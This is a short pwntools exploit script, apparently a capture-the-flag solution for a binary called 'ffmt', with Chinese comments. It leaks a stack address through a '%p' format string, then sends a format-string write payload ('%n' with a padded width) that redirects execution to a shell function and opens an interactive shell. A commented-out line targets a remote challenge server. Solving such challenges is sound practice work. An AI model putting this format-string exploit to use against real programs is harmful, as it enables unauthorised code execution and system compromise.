from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])


io=process("./ffmt")
# io=remote("43.142.108.3",28843)
elf=ELF("./ffmt")

shell=0x40121b
printf_got=elf.got[b"printf"]

io.sendlineafter(b"name: \n",b"%p")
addr=int(io.recv(14),16) #泄露rbp
print("addr:  "+hex(addr))



io.recvuntil(b"yourself~\n")
# payload=fmtstr_payload(8,{printf_got:shell})
payload=b"a"*2+b"%.4198945d%8$n"+p64(addr-0x10)  #写入rbp-0x10处 写入shell的对应十进制位宽可转化为shell地址，此题shell写到401221
# gdb.attach(io)
# pause()
io.sendline(payload)

 
io.interactive()